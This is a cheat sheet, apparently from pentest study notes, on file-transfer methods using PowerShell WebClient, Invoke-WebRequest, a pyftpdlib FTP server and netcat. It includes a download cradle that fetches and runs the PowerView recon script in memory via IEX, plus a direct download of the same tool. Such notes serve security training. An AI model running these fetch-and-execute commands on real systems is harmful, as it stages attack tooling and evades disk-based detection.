# File Transfer Techniques Using PowerShell and Other Tools

This guide covers various methods for transferring files, using PowerShell and other tools.

---

## 1. Base64 Encoding
The simplest way to transfer files is by Base64 encoding them:
1. Encode the file into Base64.
2. Copy and paste the encoded string.
3. Decode the Base64 string on the destination system.

---

## 2. PowerShell File Download with `Net.WebClient`
### Direct Download:
Use the `DownloadFile` method of the `Net.WebClient` object to download files:
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>', '<Output File Name>')
```
**Example:**
```powershell
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
```

### Custom Function:
You can define a custom PowerShell function for repeated use:
```powershell
function Download-File {
    param (
        [string]$url,
        [string]$destination
    )
    (New-Object Net.WebClient).DownloadFile($url, $destination)
}
```

#### Adding an Alias:
```powershell
Download-File 'https://example.com/file.txt' 'C:\path\to\save\file.txt'
```

#### Adding to Your Profile:
```powershell
code $profile
```

---

## 3. Running Code Directly in Memory
Run scripts directly in memory using `Invoke-Expression` (`IEX`):
```powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```
**Example:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
```

---

## 4. Using `Invoke-WebRequest` (PowerShell 3.0+)
`Invoke-WebRequest` is slower but effective for downloading files. You can use aliases like `iwr`, `curl`, and `wget`:
```powershell
Invoke-WebRequest -Uri '<URL>' -OutFile '<Output File Name>'
```

---

## 5. File Transfers via SMB Server
Use an SMB server to transfer files between systems.

---

## 6. File Transfers via FTP Server
Set up an FTP server with `pyftpdlib` and transfer files using PowerShell or an FTP client:

### Setting Up the Server:
```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

### Downloading Files:
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<server-ip>/file.txt', 'C:\Users\Public\ftp-file.txt')
```

### Using Credentials:
You can set the username and password for authentication if required.

---

## 7. Sending and Receiving Files Using `nc`

### Receiver:
```bash
echo hello | nc -l -p 8080
```

### Sender:
```bash
nc localhost 8080
```
or
```bash
echo hello | nc localhost 8080
```

---
